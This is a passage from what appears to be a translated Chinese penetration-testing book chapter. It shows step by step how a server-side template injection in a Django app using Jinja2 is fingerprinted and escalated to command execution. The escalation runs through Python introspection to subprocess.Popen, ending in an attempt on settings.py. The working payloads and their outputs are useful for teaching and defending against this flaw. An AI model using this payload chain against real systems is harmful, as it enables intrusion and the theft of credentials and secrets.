
在此 Python 片段中，如果我们在 `user_input` 变量中注入一个有效的模板指令，如 `{{8*2}}`，它将被 `render_template_string` 方法计算为 `16`，这意味着页面将显示结果 `16`。棘手的是，每个模板引擎都有自己的语法，因此并非所有引擎都会以这种方式进行评估。虽然有些允许你读取文件并执行任意代码，但其他一些甚至不允许你执行简单的乘法。

这就是为什么我们首先要做的是收集有关此潜在漏洞的更多信息。我们需要弄清楚我们处理的是什么语言以及它运行的是哪个框架。

### 指纹识别框架

自从 James Kettle 在 Black Hat USA 2015 上关于 SSTI 的演讲以来，他描绘模板框架指纹识别方法的著名图表已被复制到你可能遇到的关于此漏洞的每篇文章中，包括这里的图 6-4。为了探索其工作原理，我们将在调查表单中输入几个不同的表达式，看看它们是如何执行的。

![](img/961e81aef23040d0fbe348f58c055860_110_0.png)

图 6-4：用于指纹识别模板框架的不同 SSTI 有效载荷

我们发送有效载荷 `{{8 * '2'}}`，并在响应中收到一封电子邮件，其中包含字符串 `2` 重复总共八次，如图 6-5 所示。这种行为是 Python 解释器的典型特征，而例如 PHP 环境则会打印 `16`：

```
#### Payload

{{8* '2'}} # Python: 22222222, PHP: 16

{{8*2}} # Python: 16, PHP: 16
```

![](img/961e81aef23040d0fbe348f58c055860_111_0.png)

图 6-5：输入 8 * '2' 时典型的 Python 输出

从中我们很快得出结论，我们很可能正在处理 Python 环境中著名的 Jinja2 模板。Jinja2 通常运行在两个主要的 Web 框架之一上：Flask 或 Django。曾经有一段时间，快速查看 `Server` HTTP 响应头就会显示哪个。遗憾的是，现在没有人再将 Flask/Django 应用程序裸露在互联网上了。它们会通过 Apache 和 Nginx 服务器，或者在这种情况下，通过覆盖原始服务器指令的 AWS 负载均衡器进行传输。

不用担心。有一种快速的有效载荷适用于 Flask 和 Django Jinja2 模板，而且效果很好：`request.environ`。在两个框架中，此 Python 对象都保存有关当前请求的信息：HTTP 方法、标头、用户数据，最重要的是，应用程序加载的环境变量。

```
#### Payload

email=davidshaw@pokemail.net&user={{request.environ}}...
```

图 6-6 显示了我们从此有效载荷获得的响应。

![](img/961e81aef23040d0fbe348f58c055860_111_1.png)

图 6-6：来自 `request.environ` 的响应

Django 字面出现在 `PYENV_DIR` 路径中。中奖了。似乎该应用程序的开发人员决定用更强大的 Jinja2 模板框架替换默认的 Django 模板引擎。这对我们来说很幸运，因为虽然 Jinja2 支持 Python 表达式和操作的子集，使其在性能和生产力方面具有优势，但这种灵活性代价高昂：我们可以操作 Python 对象、创建列表、调用函数，在某些情况下甚至加载模块。

### 任意代码执行

几乎很诱人直接跳过去尝试使用类似 `{{os.open('/etc/passwd')}}` 的有效载荷访问密码文件，但那样行不通。`os` 对象很可能未在应用程序的当前上下文中定义。我们只能与在响应中呈现页面时定义的 Python 对象和方法进行交互。我们之前访问的 `request` 对象会自动由 Django 传递给模板，因此我们可以自然地检索它。`os` 模块？极不可能。

但是，这是一个最幸运的但是，大多数现代编程语言都为我们提供了一定程度的内省和反射——反射是指程序、对象或类能够检查自身的能力，包括列出自己的属性和方法、更改其内部状态等等。这是 C#、Java、Swift 等许多高级语言的常见功能——Python 也不例外。任何 Python 对象都包含指向其自身类属性及其父类的属性和指针。

例如，我们可以使用 `__class__` 属性获取任何 Python 对象的类，该属性返回一个引用此类的有效 Python 对象：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__}}...

<class 'django.core.handlers.wsgi.WSGIRequest'>
```

该类本身是更高 Python 对象 `django.http.request.HttpRequest` 的子类的子级。我们甚至不必阅读文档就能找到这一点；它写在对象本身中，在 `__base__` 变量中，正如我们用此有效载荷所看到的那样：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__}}...

<class 'django.http.request.HttpRequest'>

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__}}...

<class 'object'> ①
```

我们继续沿着继承链攀爬，在有效载荷中添加 `__base__`，直到到达最顶层的 Python 对象 ①，即所有类的父类：`object`。`object` 类本身毫无用处，但与其他类一样，它也包含对其子类的引用。因此，在攀爬链之后，现在是时候使用 `__subclasses__` 方法向下去了：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()}}...

[<class 'type'>,

<class 'dict_values'>,

<class 'django.core.handlers.wsgi.LimitedStream'>,

<class 'urllib.request.OpenerDirector'>,

<class '_frozen_importlib._ModuleLock'>,

<class 'subprocess.Popen'>, ①

--snip--

<class 'django.contrib.auth.models.AbstractUser.Meta'>,

]
```

出现了超过 300 个类。这些都是直接继承自 `object` 类并由当前 Python 解释器加载的类。

> NOTE
在 Python 3 中，所有顶级类都是 `object` 类的子类。在 Python 2 中，类必须显式继承 `object` 类。

我希望你注意到了 `subprocess.Popen` 类 ①！这是用于执行系统命令的类。我们可以在这里、现在通过引用其在子类列表中的偏移量来调用该对象，在这种特定情况下，该偏移量恰好是 282（通过手动计数得出）。我们可以使用 `communicate` 方法捕获 `env` 命令的输出：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]("env", shell=True, stdout=-1).communicate()[0]}}...
```

几秒钟后，我们收到一封电子邮件，其中泄露了机器上运行的 Python 进程的环境变量：

```
PWD=/opt/django/surveysapp

PYTHON_GET_PIP_SHA256=8d412752ae26b46a39a201ec618ef9ef7656c5b2d8529cdcbe60cd70dc94f40c

KUBERNETES_SERVICE_PORT_HTTPS=443

HOME=/root

--snip--
```

我们刚刚实现了任意代码执行！让我们看看有什么有用的东西。所有 Django 设置通常都声明在一个名为 `settings.py` 的文件中，该文件位于应用程序根目录。此文件可以包含从管理员电子邮件的简单声明到机密 API 密钥的任何内容。我们从环境变量中知道应用程序的完整路径是 `/opt/Django/surveysapp`，并且设置文件通常位于其下方的一个目录（同名）。在列表 6-1 中，我们尝试访问它。

```
#### Payload
```
